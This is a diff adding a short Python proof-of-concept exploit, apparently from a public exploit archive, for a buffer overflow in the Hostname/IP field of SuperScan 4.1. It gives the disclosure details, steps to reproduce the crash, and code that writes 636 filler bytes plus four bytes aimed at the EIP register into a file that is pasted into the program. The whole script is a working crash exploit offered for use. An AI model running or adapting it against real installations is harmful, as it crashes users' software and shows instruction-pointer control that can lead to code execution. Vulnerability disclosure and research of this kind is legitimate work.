@@ -1,0 +1,25 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# Exploit Title     : SuperScan 4.1 Scan Hostname/IP Field Buffer Overflow Crash PoC
+# Discovery by      : Luis Martínez
+# Email		    : l4m5@hotmail.com
+# Discovery Date    : 18/11/2015
+# Vendor Homepage   : http://www.foundstone.com
+# Software Link     : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx
+# Tested Version    : 4.1
+# Vulnerability Type    : Denial of Service (DoS) Local
+# Tested on OS      : Windows XP Professional SP3 x86 es
+# Steps to Produce the Crash: 
+# 1.- Run python code : python super_scan_4.1.py
+# 2.- Open super_scan_4.1.txt and copy content to clipboard
+# 3.- Open SuperScan4.1.exe
+# 4.- Paste Clipboard Scan > Hostname/IP
+# 5.- Clic on add button (->)
+# 6.- Crashed
+
+buffer = "\x41" * 636
+eip = "\x42" * 4
+
+f = open ("super_scan_4.1.txt", "w")
+f.write(buffer + eip)
+f.close()
